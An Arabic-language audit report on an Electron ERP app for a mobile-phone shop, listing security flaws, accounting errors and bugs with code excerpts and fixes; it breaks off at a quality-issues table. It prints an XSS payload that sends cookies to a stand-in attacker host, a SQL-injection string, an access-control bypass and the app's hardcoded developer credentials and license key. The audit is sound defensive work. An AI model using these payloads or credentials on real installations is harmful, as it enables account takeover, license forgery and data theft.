# تقرير مراجعة المشروع — Mobile Shop ERP

> **حالة الإصلاح (2026-07-27):** تم إصلاح جميع المشاكل الحرجة والعالية المذكورة أدناه.
> راجع `FIXES_AR.md` لتفاصيل ما تم تنفيذه، و `npm run verify` لتشغيل اختبارات التحقق
> (34 اختبار محاسبي + 44 اختبار أمني + فحص تغطية صلاحيات 205 قناة).

**تاريخ المراجعة:** 2026-07-27
**النطاق:** كامل الكود المصدري (`src/main`, `src/preload`, `src/renderer`, `src/shared`) + إعدادات البناء
**عدد الملفات المفحوصة:** ~110 ملف / ~6600 سطر في العملية الرئيسية

---

## الملخص التنفيذي

| التصنيف | حرِج | عالي | متوسط | منخفض | الإجمالي |
|---|---|---|---|---|---|
| ثغرات أمنية | 4 | 5 | 3 | 2 | **14** |
| أخطاء منطق محاسبي | 5 | 4 | 3 | — | **12** |
| أخطاء برمجية (Bugs) | 3 | 4 | 4 | 2 | **13** |
| مشاكل جودة/بنية | — | 2 | 4 | 3 | **9** |

**أخطر 5 مشاكل تحتاج إصلاحاً فورياً:**
1. **لا يوجد أي تحقق من الصلاحيات في العملية الرئيسية** — أي كود في الواجهة يستطيع استدعاء أي عملية (حذف، تصفير قاعدة البيانات، تعديل الأرصدة).
2. **ازدواج تسجيل الإيراد في قائمة الأرباح والخسائر** — إيراد الصيانة يُحسب مرتين، الأرباح مبالغ فيها بشكل كبير.
3. **إضافة المبلغ المدفوع للخزنة والماكينة معاً** — نقدية وهمية تُضاف لكل عملية بيع/تسليم صيانة.
4. **المرتجعات تخفض رصيد العميل/المورد حتى لو كانت الفاتورة مدفوعة نقداً** — رد المبلغ مرتين.
5. **كلمات مرور المطور مكتوبة داخل الكود (`014253`)** والتحقق منها يتم في الواجهة — يمكن تجاوزه بالكامل.

---

# القسم الأول: الثغرات الأمنية

## 🔴 [أمني-1] غياب كامل للتحقق من الصلاحيات في IPC — حرِج
**الملفات:** كل ملفات `src/main/ipc/*.ts`

النظام يحتوي على جداول `permissions` و `role_permissions` و `user_overrides`، لكن **لا يوجد ولا استدعاء واحد للتحقق من الصلاحية داخل أي معالج IPC**:

```bash
# البحث عن أي تحقق من صلاحية في العملية الرئيسية → لا نتائج
grep -rn "hasPermission\|checkPermission" src/main/ipc/
```

كل معالج ينفّذ العملية مباشرة. النتيجة:
- أي مستخدم (حتى «بائع») يستطيع استدعاء `settings:resetDatabase` أو `delete:sale` أو `openingBalances:updateCustomer`.
- الصلاحيات تُخزَّن ولا تُطبَّق إطلاقاً — إحساس زائف بالأمان.

**التوصية:** إنشاء دالة وسيطة (middleware) تلفّ كل `ipcMain.handle` وتتحقق من صلاحية المستخدم المُصادَق عليه في العملية الرئيسية.

---

## 🔴 [أمني-2] هوية المستخدم تأتي من الواجهة وليست موثوقة — حرِج
**الملفات:** 11 موضعاً في `src/renderer/src/pages/**`

```ts
// SalesPage.tsx:208, PurchasesPage.tsx:94, VouchersPage.tsx:67 ... (11 موضعاً)
userId: 1,   // ← مثبّت في الكود!
```

كل العمليات المالية تُسجَّل باسم المستخدم رقم 1 (admin) بغضّ النظر عن المستخدم الفعلي. هذا يُبطل **مسار التدقيق (Audit Trail)** بالكامل — وهو أحد المتطلبات الأساسية المذكورة في `CODELY.md`.

أسوأ من ذلك: حتى لو أُصلح، إرسال `userId` من الواجهة غير آمن — يجب أن تحتفظ العملية الرئيسية بالجلسة.

**التوصية:** حفظ الجلسة في العملية الرئيسية بعد `auth:login`، واشتقاق `userId` منها داخل كل معالج، وعدم قبوله من الواجهة إطلاقاً.

---

## 🔴 [أمني-3] كلمة مرور المطور مثبّتة في الكود والتحقق يتم في الواجهة — حرِج
**الملفات:** `src/renderer/src/pages/dev/DevConsolePage.tsx:11-12`, `src/main/ipc/license.handlers.ts:328,371,389,409`, `src/main/ipc/users.handlers.ts:8-9`

```ts
// DevConsolePage.tsx — التحقق يتم في الواجهة (المتصفح)!
const ENCRYPTED_DEV_USER = btoa('zerocold'.split('').reverse().join(''));
const ENCRYPTED_DEV_PASS = btoa('014253'.split('').reverse().join(''));
if (loginUser === decrypt(ENCRYPTED_DEV_USER) && loginPass === decrypt(ENCRYPTED_DEV_PASS)) {
  setUnlocked(true);
  sessionStorage.setItem('dev_unlocked', 'true');   // ← يكفي تعديلها لفتح الكونسول
}
```

ثلاث مشاكل مجتمعة:
1. **«التشفير» ليس تشفيراً** — مجرد `base64` + عكس النص. فكّها سطر واحد.
2. **التحقق في الواجهة** — يكفي فتح DevTools وكتابة `sessionStorage.setItem('dev_unlocked','true')` لتجاوزه.
3. **كلمة السر بنص صريح في العملية الرئيسية** (`data.devPassword !== '014253'`) — تظهر في ملف الحزمة `.asar` بالبحث النصي البسيط.

**التوصية:** نقل التحقق بالكامل للعملية الرئيسية، وتخزين bcrypt hash بدل النص الصريح، وإزالة أي منطق مصادقة من الواجهة.

---

## 🔴 [أمني-4] `users:resetByDev` يسمح بإعادة تعيين كلمة مرور أي مستخدم — حرِج
**الملف:** `src/main/ipc/users.handlers.ts:136-147`

```ts
ipcMain.handle('users:resetByDev', async (_event, data) => {
  if (data.devUser !== decryptDev(ENCRYPTED_DEV_USER) || data.devPassword !== decryptDev(ENCRYPTED_DEV_PASS)) {
    return { success: false, message: 'بيانات المطور غير صحيحة' };
  }
  // ...يعيد تعيين كلمة مرور أي مستخدم
```

بما أنّ بيانات المطور معروفة ومضمّنة في الحزمة، فأي شخص لديه نسخة من البرنامج يستطيع الاستيلاء على حساب المدير على أي تثبيت. صفحة تسجيل الدخول تعرض «نسيت كلمة المرور؟» وتطلب بيانات المطور مباشرةً من المستخدم النهائي — وهذا يخالف صراحةً الملاحظة المسجّلة في `CODELY.md`:

> *"End users should never be asked for developer credentials."*

---

## 🟠 [أمني-5] نظام الترخيص قابل للتجاوز بالكامل — عالي
**الملف:** `src/main/ipc/license.handlers.ts`

عدة نقاط ضعف مجتمعة:

| المشكلة | السطر | الشرح |
|---|---|---|
| المفتاح السري في الكود | 11 | `SECRET_KEY = 'm0b1l3_sh0p_3rp_s3cr3t_k3y_2026_z3r0c0ld'` — يُستخرج من `.asar` مباشرة |
| أكواد التفعيل تُخزَّن محلياً | 258 | `activation_codes.dat` على **جهاز العميل**؛ من يملك المفتاح يستطيع توليد ملف أكواد صالح |
| لا توجد توقيعات رقمية | 285-300 | الترخيص hash بـ SHA-256 مع مفتاح متماثل معروف — يمكن تزويره بالكامل |
| `chmod 0o444` وهمي | 30, 306 | على Windows لا يمنع الحذف؛ وحذف `license.dat` + `trial.dat` + `lastaccess.dat` يعيد تشغيل التجربة |
| بوابة الترخيص في الواجهة | `App.tsx:95` | `const isLicensed = licenseStatus?.status === 'active' \|\| 'trial'` — فحص في React فقط، ومعالجات IPC تعمل بدونه |

**ملاحظة مهمة:** `license:activate` يقرأ الأكواد من ملف على نفس الجهاز، ما يعني أن الكود الذي يولّده المطور على **جهازه** لن يوجد أصلاً في ملف أكواد **العميل** — النظام لا يعمل عملياً عبر الأجهزة (خلل وظيفي بالإضافة للأمني).

**التوصية:** استخدام توقيع غير متماثل (Ed25519/RSA): المطور يوقّع بالمفتاح الخاص، والتطبيق يتحقق بالمفتاح العام المضمّن. لا حاجة لملف أكواد على جهاز العميل.

---

## 🟠 [أمني-6] حقن SQL في تقارير كشوف الحساب والعمليات — عالي
**الملفات:** `src/main/ipc/statement.handlers.ts:119-120`, `src/main/ipc/reports.handlers.ts:537-539`

```ts
const dateFilter = (field: string) => {
  const parts: string[] = [];
  if (filters?.fromDate) parts.push(`${field} >= '${filters.fromDate}'`);  // ← إدراج مباشر
  if (filters?.toDate)   parts.push(`${field} <= '${filters.toDate}'`);
  return parts.length > 0 ? `AND ${parts.join(' AND ')}` : '';
};
```

قيم `fromDate` / `toDate` تُدرَج نصياً في الاستعلام دون معاملات مرتبطة (parameterized). قناة IPC مفتوحة عبر `preload` العام:

```ts
// preload.ts — قناة عامة بلا قائمة بيضاء
invoke: (channel: string, ...args: unknown[]) => ipcRenderer.invoke(channel, ...args)
```

أي كود يُنفَّذ في الواجهة (مثلاً عبر XSS في الطباعة — انظر [أمني-8]) يستطيع تمرير:
```js
window.api.invoke('cashAccount:statement', 1, { fromDate: "2020-01-01' OR '1'='1" })
```

**التوصية:** استخدام `?` والمعاملات المرتبطة في كل المواضع (النمط مستخدم بالفعل في بقية الملفات — هذه استثناءات).

---

## 🟠 [أمني-7] `db:exportCSV` يقبل اسم جدول من الواجهة دون قائمة بيضاء — عالي
**الملف:** `src/main/ipc/database.handlers.ts:10, 60`

```ts
const rows = db.prepare(`SELECT * FROM ${tableName}`).all() as any[];
```

`tableName` يأتي من الواجهة مباشرة. يسمح بقراءة أي جدول بما فيه `users` (هاشات كلمات المرور) وتصديرها لملف. كما يسمح بحقن SQL كامل عبر اسم جدول مُلفَّق.

**التوصية:** التحقق من `tableName` مقابل قائمة الجداول المُرجَعة من `sqlite_master` قبل الاستخدام.

---

## 🟠 [أمني-8] XSS في نظام الطباعة (HTML غير مُهرَّب) — عالي
**الملف:** `src/main/ipc/print.handlers.ts:74-253`

```ts
<td>${item.ItemName || item.IMEI || item.ServiceName || '—'}</td>
<div class="company-name">${companyInfo.company_name || 'محل الموبايلات'}</div>
${invoiceData.notes ? `<div class="invoice-notes">ملاحظات: ${invoiceData.notes}</div>` : ''}
```

كل البيانات (أسماء أصناف، أسماء عملاء، ملاحظات، بيانات الشركة) تُدرَج في HTML **دون تهريب**. اسم صنف مثل:

```
<img src=x onerror="fetch('http://attacker/'+document.cookie)">
```

سيُنفَّذ في نافذة الطباعة. والنافذة تُحمَّل عبر `data:` URL:

```ts
previewWindow.loadURL('data:text/html;charset=utf-8,' + encodeURIComponent(html));
```

نوافذ `data:` **لا ترث سياسة CSP** المعرَّفة في `index.html`، ولا يوجد `sandbox: true` عليها.

**التوصية:** دالة `escapeHtml()` على كل قيمة مُدرَجة + `sandbox: true` على نافذة الطباعة.

---

## 🟠 [أمني-9] `sidebar:repairConfig` ينفّذ JavaScript عشوائياً في الواجهة — عالي
**الملف:** `src/main/ipc/settings.handlers.ts:6-29`

```ts
const result = await win.webContents.executeJavaScript(`...`);
```

استخدام `executeJavaScript` من العملية الرئيسية لتعديل `localStorage` نمط خطر ويفتح باب تنفيذ كود في سياق الواجهة. المنطق نفسه يمكن تنفيذه في الواجهة مباشرة دون هذه القناة.

---

## 🟡 [أمني-10] كلمة مرور الجهاز مخزَّنة بنص صريح — متوسط
**الملف:** `src/main/database/migrations/index.ts` (جدول `maintenance_tickets`, عمود `DevicePassword`)

كلمات مرور أجهزة العملاء تُخزَّن كنص صريح في قاعدة بيانات SQLite غير مشفّرة. أي شخص لديه وصول للملف (أو للنسخة الاحتياطية، أو للمشاركة الشبكية) يقرأها.

**التوصية:** تشفير العمود، أو على الأقل تشفير قاعدة البيانات بالكامل عبر SQLCipher.

---

## 🟡 [أمني-11] `sandbox: false` في النافذة الرئيسية — متوسط
**الملف:** `src/main/index.ts:44`

`contextIsolation: true` و `nodeIntegration: false` مضبوطان جيداً ✅، لكن `sandbox: false` يُضعف العزل. مع عدم وجود قائمة بيضاء للقنوات في `preload`، أي XSS في الواجهة يحصل على وصول كامل لكل معالجات IPC.

---

## 🟡 [أمني-12] رفع النسخ الاحتياطية للسحابة دون تحقق — متوسط
**الملف:** `src/main/ipc/database.handlers.ts:280-330`

قاعدة البيانات كاملةً (بما فيها هاشات كلمات المرور وكلمات مرور أجهزة العملاء) تُرفع لأي URL يُدخله المستخدم، بلا تحقق من الشهادة أو من نطاق الوجهة. `apiKey` يُخزَّن بنص صريح في جدول `settings`.

---

## 🔵 [أمني-13] `db:changePath` بلا تحقق — منخفض
يقبل أي مسار ملف ويكتبه في `db_settings.json` دون التحقق من أنه ملف SQLite صالح، ما قد يؤدي لتعطّل التطبيق عند الإقلاع (DoS ذاتي).

## 🔵 [أمني-14] ملفات مسجّلة في Git لا ينبغي وجودها — منخفض
```
.codely-cli/auto-saves/*.json   (5 ملفات — سجلّات محادثات قد تحوي معلومات حساسة)
.codely/clipboard/*.png
electron_err.txt / electron_out.txt   (تكشف مسارات النظام: C:\Users\accmo\AppData\...)
```
**التوصية:** إضافتها إلى `.gitignore` وإزالتها من التتبع.

---

# القسم الثاني: أخطاء المنطق المحاسبي

## 🔴 [محاسبي-1] ازدواج تسجيل إيراد الصيانة في قائمة الدخل — حرِج
**الملفات:** `src/main/ipc/reports.handlers.ts:236-247`, `src/main/ipc/maintenance.handlers.ts` (معالج `deliver`)

عند تسليم صيانة، الكود ينشئ **سجلّين** لنفس العملية:
1. سجل في `maintenance_deliveries` بقيمة `TotalCost`
2. **فاتورة بيع** في جدول `sales` بقيمة `TotalAmount` نفسها (مع `Source='maintenance'`)

ثم قائمة الأرباح والخسائر تجمع الاثنين:

```ts
const salesGross = ... FROM sales WHERE IsVoided = 0 AND IsWarranty = 0   // ← تشمل فاتورة الصيانة
const maintenanceRevenue = ... FROM maintenance_deliveries WHERE VoidedSaleID IS NULL  // ← نفس المبلغ مجدداً
const totalRevenue = netSales + maintenanceRevenue.total - ...
```

**الأثر:** تسليم صيانة بـ 800 ج.م يُسجَّل كإيراد **1600 ج.م**. عمود `Source` موجود في الجدول لكنه **لا يُستخدم في أي استعلام** للاستبعاد.

**الإصلاح:**
```sql
-- في salesGross:
WHERE IsVoided = 0 AND IsWarranty = 0 AND (Source IS NULL OR Source != 'maintenance')
```
نفس المشكلة موجودة في `reports:financialPosition` (السطر ~430) و `reports:sales`.

---

## 🔴 [محاسبي-2] المبلغ المدفوع يُضاف للخزنة **و** للماكينة معاً — حرِج
**الملفات:** `sales.handlers.ts:170-177`, `maintenance.handlers.ts` (خطوة 6)

```ts
if (paidAmount > 0) {
  if (data.CashAccountID)    { cash_accounts.Balance   += paidAmount; }   // if منفصلة
  if (data.PaymentMethodID)  { payment_methods.Balance += paidAmount; }   // ← وليست else if
}
```

الواجهة (`SalesPage.tsx:553-560`) تعرض القائمتين معاً وتسمح باختيار **الاثنين**:
```tsx
<Select label="مصدر استلام المبلغ" value={cashAccountId} ...>
<Select label="أو ماكينة/محفظة دفع" value={paymentMethodId} ...>
```

**الأثر:** عميل دفع 1000 ج.م → الخزنة +1000 **و** الماكينة +1000 = **2000 ج.م نقدية وهمية**. تتراكم يومياً وتُفسد قائمة المركز المالي والتسويات.

**الإصلاح:** جعلها `else if` في الخلفية، ومنع الاختيار المزدوج في الواجهة.

---

## 🔴 [محاسبي-3] مرتجع المبيعات يخصم من رصيد العميل حتى لو كانت الفاتورة نقدية — حرِج
**الملف:** `src/main/ipc/sales.handlers.ts:243-247`

```ts
// Refund from cash account
if (data.CashAccountID) { cash_accounts.Balance -= totalAmount; }
// Reduce customer balance
const sale = ... SELECT CustomerID FROM sales WHERE SaleID = ?
if (sale?.CustomerID) { customers.Balance -= totalAmount; }   // ← دائماً، بلا شرط
```

الكود يردّ المبلغ نقداً **و** يخفض رصيد العميل — أي يردّ المبلغ **مرتين**.

**السيناريو:** فاتورة 300 ج.م مدفوعة كاملة نقداً → مرتجع كامل → الخزنة −300 (صحيح) + رصيد العميل −300 (خطأ) → العميل صار له رصيد دائن 300 ج.م لم يدفعه.

**الإصلاح:** المرتجع يجب أن يخصم من رصيد العميل **فقط بقدر المبلغ غير المدفوع** من تلك الفاتورة، والباقي يُردّ نقداً.

---

## 🔴 [محاسبي-4] مرتجع المشتريات يخفض رصيد المورد حتى لو كانت مدفوعة — حرِج
**الملف:** `src/main/ipc/purchases.handlers.ts:240-249`

نفس الخلل بالضبط في الاتجاه المعاكس:
```ts
suppliers.Balance -= totalAmount;              // دائماً
if (data.CashAccountID) cash_accounts.Balance += totalAmount;  // واسترداد نقدي أيضاً
```
فاتورة شراء مدفوعة نقداً + مرتجع → استلمنا النقد **و** المورد يدين لنا بالمبلغ = استفادة مزدوجة وهمية.

---

## 🔴 [محاسبي-5] قطع الغيار تُخصم من المخزون مرتين عند الاسترجاع — حرِج
**الملفات:** `maintenance.handlers.ts` (issuePart / deliver / cancel / return), `delete.handlers.ts:280`

مسار القطع مختلّ:
1. `maintenance:issuePart` → يخصم من `stock_quantities` ✅
2. `maintenance:deliver` → يُنشئ صفوفاً في `sale_details` لنفس القطع **دون خصم إضافي** (صحيح)
3. لكن `delete:maintenanceDelivery` (السطر 280) يعيد الكمية للمخزون بناءً على `sale_details`
4. و `maintenance:return` / `maintenance:cancel` يعيدانها **مرة أخرى** بناءً على `maintenance_parts`

**الأثر:** قطعة واحدة خُصمت مرة واحدة، لكن الاسترجاع يضيفها مرتين → تضخّم وهمي في المخزون وفي قيمته بالمركز المالي.

---

## 🟠 [محاسبي-6] `الأصول = النقدية + العملاء + المخزون` ولا تشمل طرق الدفع في الإجمالي — عالي
**الملف:** `src/main/ipc/openingBalance.handlers.ts:53-54`

```ts
totalAssets: totalCash + totalPaymentMethods + totalCustomers + totalInventory,
totalLiabilities: totalSuppliers + totalEmployees,
```

هنا صحيح ✅، لكن في `reports:financialPosition` المعادلة المحاسبية **لا تُوازن أبداً**:

```ts
const balanceCheck = totalAssets - totalLiabilities;
const retainedEarnings = balanceCheck - explicitCapital;   // ← أرباح محتجزة "مشتقّة"
const calculatedCapital = explicitCapital + netProfit;     // ← ورقم آخر مختلف
```

يوجد رقمان لحقوق الملكية (`calculatedCapital` و `retainedEarnings`) لا يتطابقان أبداً، ولا يوجد أي فحص للتوازن (`Assets = Liabilities + Equity`). النظام لا يستطيع اكتشاف أخطائه الحسابية ذاتياً.

**التوصية:** إضافة سطر تحقّق صريح يعرض الفرق (`Difference`) وينبّه إذا لم يساوِ صفراً.

---

## 🟠 [محاسبي-7] إيراد الخدمات يشمل «أصل المبلغ» المحوَّل — عالي
**الملفات:** `reports.handlers.ts:255-258, 315-319`, `services.handlers.ts`

```ts
serviceRevenue = SUM(ChargeAmount)                                        // إيراد
serviceCost    = SUM(ServiceCost + Amount + TransferCost)                 // تكلفة
```

في تحويل رصيد بقيمة 100 ج.م بعمولة 5 ج.م: العميل يدفع 105، ونحن ندفع 100 من الماكينة.
- الربح الصافي المحسوب = 105 − 103 = 2 ✅ (صحيح رقمياً)
- **لكن** رقم «الإيرادات» يُضخَّم بـ 100 ج.م، ورقم «التكاليف» بـ 100 ج.م.

**الأثر:** رقم المبيعات/الإيراد الظاهر في التقارير مبالغ فيه جداً (محل يحوّل 50 ألف شهرياً بعمولات 1500 سيُظهر إيراداً 50 ألف بدلاً من 1500). هذا يخالف مبدأ **الوكيل مقابل الأصيل** (Agent vs Principal) المحاسبي.

**التوصية:** تسجيل العمولة فقط كإيراد (`ChargeAmount - Amount`)، وعدم إدراج أصل المبلغ في الإيراد ولا في التكلفة.

---

## 🟠 [محاسبي-8] مصروف الرواتب يُرشَّح بـ `PaymentDate` — تناقض بين التقريرين — عالي
**الملف:** `reports.handlers.ts:345-348` مقابل `reports.handlers.ts:~455`

```ts
// قائمة الدخل (مُرشَّحة بالتاريخ):
FROM salaries WHERE 1=1 AND PaymentDate >= ? AND PaymentDate <= ?

// المركز المالي (كل الفترات):
SELECT SUM(NetSalary) FROM salaries       // ← بلا ترشيح
```

`PaymentDate` تبقى `NULL` حتى يُصرف الراتب. النتيجة:
- راتب **صدر ولم يُصرف** → يُستبعد من قائمة الدخل المُرشَّحة، لكنه يدخل في صافي ربح المركز المالي.
- التقريران يعطيان صافي ربح مختلفاً لنفس البيانات.

كما أنّ المصروف يُعترف به عند **الدفع** لا عند **الاستحقاق** — مخالف لمبدأ الاستحقاق المحاسبي.

---

## 🟠 [محاسبي-9] مصروف الإيجار يُحسب مرتين — عالي
**الملف:** `reports.handlers.ts:336-340` و `350-357`

```ts
// المصروفات العمومية — تشمل PartyType='rent'
generalExpenses = SUM(Amount) FROM vouchers
  WHERE VoucherType='payment' AND (PartyType='general' OR PartyType IS NULL OR PartyType='rent')

// ثم مصروف الإيجار مرة أخرى من جدول منفصل
rentExpenses = SUM(rp.Amount) FROM rent_payments rp JOIN rents r ... WHERE r.RentType='expense'

totalExpenses = generalExpenses + salariesExpense + rentExpenses + warrantyPartsCost
```

إذا سُجّل الإيجار كسند صرف بـ `PartyType='rent'` **وأيضاً** في `rent_payments`، يُخصم مرتين.

بالإضافة: `warrantyPartsCost` يُحتسب في `expenses.warrantyParts` **و** يُعرض في `costs.warrantyParts`، ما يربك القارئ (رغم أن `totalDirectCosts` لا يجمعه — سلوك غير متسق).

---

## 🟡 [محاسبي-10] `مرتجع المبيعات` لا يعكس تكلفة البضاعة المباعة بشكل صحيح — متوسط
**الملف:** `reports.handlers.ts:290-295`

```ts
const cogsReturns = db.prepare(`
  SELECT SUM(sd.UnitCost * sd.Quantity)
  FROM sale_details sd
  JOIN sale_returns sr ON sd.SaleID = sr.SaleID   // ← يربط بالفاتورة كاملةً
`)
```

الربط على `SaleID` يجلب **كل بنود الفاتورة الأصلية** وليس البنود المرتجعة فقط. مرتجع جزئي (بند واحد من خمسة) يعكس تكلفة **الفاتورة كلها**.

**الإصلاح:** الربط عبر `sale_return_details` بدلاً من `sale_details`.

---

## 🟡 [محاسبي-11] التسوية تكتب الرصيد مباشرة بلا قيد تعديل — متوسط
**الملف:** `src/main/ipc/settlement.handlers.ts:41-58`

```ts
db.prepare('UPDATE cash_accounts SET Balance = ? WHERE CashAccountID = ?').run(item.ActualBalance, item.ItemID);
```

الفرق (العجز/الزيادة) يُسجَّل في `settlement_details` كسجلّ تاريخي فقط، لكنه **لا يُسجَّل كمصروف أو إيراد** في قائمة الدخل. عجز خزنة 5000 ج.م يختفي من الأرباح تماماً.

كذلك في قسم `inventory`: `UPDATE stock_quantities SET Quantity = ?` بدون `WarehouseID` — يعدّل أول مخزن فقط.

---

## 🟡 [محاسبي-12] خصم المخزون يتجاهل المخزن (Warehouse) — متوسط
**الملفات:** `sales.handlers.ts:140,235`, `delete.handlers.ts:22,280`, `settlement.handlers.ts:51`

```ts
const stock = db.prepare('SELECT ID, Quantity FROM stock_quantities WHERE ItemID = ?').get(item.ItemID);
```

جدول `stock_quantities` مُعرَّف بـ `UNIQUE(ItemID, WarehouseID)` — أي صفوف متعددة لكل صنف. الاستعلام يأخذ **أول صف فقط**، فيخصم البيع من المخزن الخطأ.

**السيناريو:** بيع من «مخزن الصيانة» يخصم من «المخزن الرئيسي». التحقق من الرصيد يستخدم `SUM(Quantity)` عبر كل المخازن، فيمرّ البيع، ثم يُخصم من مخزن قد يصبح رصيده سالباً.

---

# القسم الثالث: الأخطاء البرمجية

## 🔴 [برمجي-1] استعلام يشير لعمود غير موجود → تعطّل كشف حساب الخزنة — حرِج
**الملف:** `src/main/ipc/statement.handlers.ts:163`

```ts
WHERE p.PaymentSourceType = 'cash_account' AND p.PaymentSourceID = ? ...
```

العمود في المخطط اسمه **`PaymentSource`** وليس `PaymentSourceType`:
```ts
// migrations/index.ts:889
db.exec(`ALTER TABLE purchases ADD COLUMN PaymentSource TEXT`);
```

**تم التحقق عملياً:**
```
SQL ERROR -> no such column: p.PaymentSourceType
```

**الأثر:** `cashAccount:statement` يرمي استثناءً دائماً → كشف حساب الخزنة **معطّل بالكامل**.

---

## 🔴 [برمجي-2] معالجات IPC تُسجَّل خارج دالة التسجيل — حرِج
**الملف:** `src/main/ipc/statement.handlers.ts:5, 112`

```ts
// السطر 5 — خارج أي دالة، تُنفَّذ وقت الـ import
ipcMain.handle('statement:getOperationDetail', ...);
ipcMain.handle('cashAccount:statement', ...);

// السطر 266 — الدالة المُصدَّرة تحوي معالجَين فقط
export function registerCustomerStatementHandlers() { ... }
```

المعالجان الأولان يُسجَّلان عند تحميل الوحدة (وقت `import`) قبل جاهزية التطبيق، بينما البقية داخل الدالة. سلوك غير متسق وهشّ — وإذا أُعيد تحميل الوحدة يرمي `Attempted to register a second handler`.

---

## 🔴 [برمجي-3] `JOIN` خاطئ يربط رقم الفاتورة برقم العميل — حرِج
**الملف:** `src/main/ipc/reports.handlers.ts:555`

```sql
FROM sale_returns r LEFT JOIN customers c ON r.SaleID = c.CustomerID
```

يربط `SaleID` بـ `CustomerID` — حقلان لا علاقة بينهما إطلاقاً.

**تم التحقق عملياً:** مرتجع على الفاتورة رقم 7 لعميل «سارة» يظهر باسم «خالد» (العميل رقم 7).

**الإصلاح:** `JOIN sales s ON r.SaleID = s.SaleID LEFT JOIN customers c ON s.CustomerID = c.CustomerID`

---

## 🟠 [برمجي-4] `String.replace` يستبدل أول تطابق فقط → استعلامات معطوبة — عالي
**الملف:** `src/main/ipc/statement.handlers.ts:290, 306, 313, 322, 331, 393, 402, 411`

```ts
let dateFilter = ' AND Date >= ? AND Date <= ?';
dateFilter.replace('Date', 'r.Date')
```

**تم التحقق:**
```
' AND Date >= ? AND Date <= ?'  →  ' AND r.Date >= ? AND Date <= ?'
                                                      ↑ لم تُستبدل
```

في استعلامات `JOIN` يصبح `Date` غامضاً (`ambiguous column name`) أو يشير للجدول الخطأ. عند استخدام مرشِّح تاريخين معاً في كشف حساب عميل/مورد، يفشل الاستعلام أو يعطي نتائج خاطئة.

**ملاحظة:** في `reports.handlers.ts:228-231` استُخدم `replace(/Date/g, ...)` بشكل صحيح — لكن هذا يخلق مشكلة أخرى: `dateFilter.replace(/Date/g,'t.Date')` يحوّل أيضاً `PaymentDate` إلى `Paymentt.Date`. مصدر هشاشة عام.

**الإصلاح:** بناء المرشِّحات بأسماء أعمدة مؤهَّلة من البداية بدل الاستبدال النصي.

---

## 🟠 [برمجي-5] توليد أرقام المستندات بـ `COUNT(*)` → تعارض وفقدان بيانات — عالي
**الملفات:** كل المعالجات — `sales:create`, `purchases:create`, `vouchers:create`, `maintenance:receive`, `transfers:create`, `settlements:apply` ...

```ts
const numResult = db.prepare("SELECT COUNT(*) as count FROM sales WHERE Date = ?").get(dateStr);
const saleNumber = `SAL-${dateStr}-${(numResult.count + 1).toString().padStart(4, '0')}`;
```

**تم التحقق:** بعد `delete:sale` للفاتورة رقم 2 من أصل 3، العدّاد يعود لـ 2 فيولّد `0003` المستخدم بالفعل → **انتهاك قيد `UNIQUE`** → فشل حفظ الفاتورة وضياع العملية.

المشكلة أخطر مع قاعدة بيانات مشتركة على الشبكة (ميزة موجودة في `db:createNetwork`): جهازان يبيعان في نفس اللحظة → نفس الرقم.

**الإصلاح:** جدول تسلسلات مخصّص، أو `MAX(rowid)`، أو الاعتماد على `AUTOINCREMENT` في تكوين الرقم.

---

## 🟠 [برمجي-6] `maintenance:receive` بلا معاملة (transaction) — عالي
**الملف:** `src/main/ipc/maintenance.handlers.ts:105-145`

إنشاء العميل + إدراج التذكرة + إدراج سجل الحالة تُنفَّذ كثلاث عمليات منفصلة بلا `db.transaction()`. فشل في المنتصف يترك عميلاً بلا تذكرة، أو تذكرة بلا سجل حالة.

نفس المشكلة في `deductions:create` و `serials:add`.

---

## 🟠 [برمجي-7] `maintenance:deliver` يخصم المخزون **صفراً** رغم إنشاء فاتورة بيع — عالي
**الملف:** `maintenance.handlers.ts` (خطوة 2)

الفاتورة المُنشأة تحتوي `sale_details` بقطع الغيار، لكن حساب تكلفة البضاعة المباعة في قائمة الدخل يقرأ من `sale_details`:

```ts
const cogs = ... FROM sale_details sd JOIN sales s ... WHERE s.IsVoided = 0 AND s.IsWarranty = 0
```

بينما تكلفة قطع الصيانة تُحسب **أيضاً** من `maintenance_parts`:
```ts
const partsCost = ... FROM maintenance_parts mp JOIN maintenance_tickets t ...
```

**النتيجة:** تكلفة قطع الغيار تُخصم **مرتين** من الأرباح.

---

## 🟡 [برمجي-8] `generateActivationCode(days)` يتجاهل معامله — متوسط
**الملف:** `license.handlers.ts:69-74`
```ts
function generateActivationCode(days: number): string {
  const code = crypto.randomBytes(8).toString('hex').toUpperCase();  // days غير مستخدم
```
معامل ميت يوحي بأن المدة مُضمّنة في الكود بينما هي ليست كذلك.

## 🟡 [برمجي-9] `autoBackup` يحذف ملفات غير النسخ الاحتياطية — متوسط
**الملف:** `src/main/index.ts:160-170`
```ts
const files = fs.readdirSync(backupDir);
for (const file of files) {
  if (stats.mtimeMs < cutoff) { fs.unlinkSync(filePath); }   // بلا فلترة الامتداد
}
```
يحذف **أي** ملف أقدم من 7 أيام في المجلد، بما فيه المجلدات الفرعية (سيرمي استثناءً على المجلد).

## 🟡 [برمجي-10] النسخ الاحتياطي لا يتعامل مع وضع WAL — متوسط
**الملفات:** `backup.handlers.ts:24`, `index.ts:152`
```ts
fs.copyFileSync(dbPath, backupPath);
```
قاعدة البيانات تعمل بـ `journal_mode = WAL` (`connection.ts:31`). نسخ ملف `.db` وحده **دون** `-wal` و `-shm` قد ينتج نسخة ناقصة أو تالفة.
**الإصلاح:** استخدام `db.backup()` المدعومة في `better-sqlite3`.

## 🟡 [برمجي-11] `backup:restore` يكتب لمسار خاطئ عند تخصيص المسار — متوسط
**الملف:** `backup.handlers.ts:44`
```ts
const dbPath = path.join(app.getPath('userData'), 'mobile_shop.db');   // يتجاهل المسار المخصّص
```
إذا كان المستخدم قد غيّر مسار قاعدة البيانات عبر `db:changePath`، الاستعادة تكتب على المسار الافتراضي بينما التطبيق يقرأ من المسار المخصّص → «الاستعادة نجحت» لكن البيانات لا تتغيّر.

## 🔵 [برمجي-12] `roles:delete` يعيد تعيين المستخدمين لدور رقم 1 دون التحقق — منخفض
إذا حُذف الدور رقم 1 نفسه أو لم يكن موجوداً، يترك المستخدمين بـ `RoleID` معطوب.

## 🔵 [برمجي-13] `notifications:dismissed` منطق مزدوج ومتناقض — منخفض
**الملف:** `notifications.handlers.ts:36-45` — الاستعلام يُرشِّح بـ `SnoozedUntil > datetime('now')` ثم يُعاد الترشيح في JS بـ `new Date(r.SnoozedUntil + 'Z')`، مع خلط توقيت محلي/UTC.

---

# القسم الرابع: مشاكل الجودة والبنية

| # | المشكلة | الملف | الشدة |
